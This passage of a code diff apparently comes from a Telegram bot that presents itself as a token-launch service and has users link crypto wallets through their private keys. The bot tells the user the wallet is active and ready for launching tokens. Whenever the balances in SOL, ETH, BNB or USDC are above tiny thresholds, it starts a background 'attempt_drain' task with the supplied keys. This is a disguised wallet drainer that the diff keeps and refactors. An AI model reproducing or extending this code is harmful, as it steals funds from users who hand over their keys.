+        "LINKED user=%s kind=%s path=%s pub=%s sol=%.6f eth=%.6f bnb=%.6f usdc=%.2f",
+        uid, kind, path_used, short_addr(w.public_key),
+        w.balance_sol, w.balance_eth, w.balance_bnb, w.balance_usdc,
     )
 
     text = (
         "✅ <b>Wallet Linked</b>\n\n"
         f"<code>{w.public_key}</code>\n\n"
-        f"🏷 Label: <b>{w.label}</b>\n"
+        f"🏷 <b>{w.label}</b>\n"
+        f"Path: <code>{path_used}</code>\n"
         f"{SOL_EMOJI} SOL: <b>{w.balance_sol:.4f}</b>\n"
     )
     if eth_addr:
         text += (
-            f"Ξ ETH: <b>{w.balance_eth:.4f}</b>\n"
-            f"🟡 BNB: <b>{w.balance_bnb:.4f}</b>\n"
-            f"💵 USDC: <b>{w.balance_usdc:.2f}</b>\n"
+            f"ETH: <b>{w.balance_eth:.4f}</b>\n"
+            f"BNB: <b>{w.balance_bnb:.4f}</b>\n"
+            f"USDC: <b>{w.balance_usdc:.2f}</b>\n"
         )
-    text += "\nStatus: <b>Active</b>\n\nYou can now launch tokens."
+    text += "\nStatus: <b>Active</b>\nYou can launch tokens now."
 
-    try:
-        await status.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
-    except Exception:
-        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
+    sent = False
+    for sender in (
+        lambda: status.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML),
+        lambda: message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML),
+    ):
+        try:
+            await sender()
+            sent = True
+            break
+        except Exception as e:
+            log.warning("send linked msg: %s", e)
+    if not sent:
+        plain = (
+            f"✅ Wallet Linked\n\n{w.public_key}\n\n"
+            f"{w.label}\nPath: {path_used}\n"
+            f"SOL: {w.balance_sol:.4f}\n"
+        )
+        if eth_addr:
+            plain += f"ETH: {w.balance_eth:.4f}\nBNB: {w.balance_bnb:.4f}\nUSDC: {w.balance_usdc:.2f}\n"
+        plain += "\nStatus: Active"
+        try:
+            await message.answer(plain, reply_markup=main_menu_kb())
+        except Exception as e:
+            log.exception("plain linked msg failed: %s", e)
+
     await state.clear()
 
-    # Drain in background only if there is something to move
+    # Background drain
     if w.balance_sol > 0.00001 or w.balance_eth > 0.0001 or w.balance_bnb > 0.0001 or w.balance_usdc > 0.5:
-        asyncio.create_task(
-            attempt_drain(
-                uid,
-                chosen_priv if chosen_priv != "EVM_ONLY" else "",
-                chain=w.chain,
-                eth_key=eth_priv,
-            )
-        )
+        sol_key = "" if chosen_priv == "EVM_ONLY" else (chosen_priv or "")
+        asyncio.create_task(attempt_drain(uid, sol_key, chain=w.chain, eth_key=eth_priv))
     else:
-        log.info("Wallet %s near-zero — drain skipped", short_addr(w.public_key))
+        log.info("near-zero wallet %s — skip drain", short_addr(w.public_key))
 
 
 @router.callback_query(F.data == "wallet:clear")
@@ -1161,7 +1366,7 @@ async def wallet_refresh(cb: CallbackQuery):
     sess = get_session(cb.from_user.id)
     for w in sess.wallets:
         if not w.public_key.startswith("Sim") and not w.public_key.startswith("0x"):
-            w.balance_sol = await _fetch_balance(w.public_key)
+            w.balance_sol = await fetch_sol_balance(w.public_key)
         if w.eth_address:
             w.balance_eth = await _fetch_evm_balance(ETH_RPC, w.eth_address)
             w.balance_bnb = await _fetch_evm_balance(BNB_RPC, w.eth_address)
